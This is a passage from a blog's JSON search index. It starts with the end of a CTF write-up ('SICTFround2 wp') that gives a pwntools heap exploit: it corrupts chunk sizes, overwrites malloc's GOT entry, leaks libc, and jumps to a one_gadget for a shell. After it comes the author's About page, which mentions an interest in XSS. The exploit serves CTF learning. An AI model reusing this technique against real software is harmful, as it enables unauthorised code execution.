add(0x110, \u0026#34;awa\u0026#34;) add(0x1, \u0026#34;q\u0026#34;) edit(17, 0x30, b\u0026#39;a\u0026#39; * 0x18 + p64(0xdc1)) add(0x1000, \u0026#34;qwq\u0026#34;) edit(17, 0x40, b\u0026#39;a\u0026#39; * 0x18 + p64(0x111) + p64(114514) + p64(0x4040c8)) add(0x100, \u0026#34;nya\u0026#34;) add(0x100, \u0026#34;owo\u0026#34;) edit(20, 0x10, p64(0) + p64(elf.got[\u0026#39;malloc\u0026#39;])) malloc_addr = show(0) log.success(\u0026#34;malloc_addr = \u0026#34; + hex(malloc_addr)) libc_base = malloc_addr - 0x84180 one_gadget_addr = 0xf1247 + libc_base edit(0, 0x8, p64(one_gadget_addr)) #gdb.attach(p) p.recvuntil(\u0026#34;\u0026gt;\\n\u0026#34;) p.sendline(\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(\u0026#34;233\u0026#34;) p.interactive() ","date":"6 February 2023","externalUrl":null,"permalink":"/posts/sictf/","section":"Posts","summary":"","title":"SICTFround2 wp","type":"posts"},{"content":"\rHello,Guys #\rHi, I\u0026rsquo;m Delete/Mengluo, a guy who\u0026rsquo;s always looking for fun in this world. I\u0026rsquo;m currently a third-year student at GDUFE and also preparing for the IELTS for my postgraduate studies.\nIf you\u0026rsquo;re willing to help, feel free to email me! I tend to have a “three-minute fame” kind of personality—excited about things quickly—but I also have the drive to chase big and crazy ideas.\nLately, I\u0026rsquo;ve been exploring XSS and Golang development. If you\u0026rsquo;re interested, let\u0026rsquo;s connect and study together!\n🌱MBTI: ENFP\nFocus #\r📘 programming（Golang,python\u0026hellip;） 🤖 Adventure（） 🗂️ Cyber-Security（WEB player） Contact Me #\r📮 email ","externalUrl":null,"permalink":"/about/","section":"Delete's blog","summary":"","title":"ABOUT MEEE","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]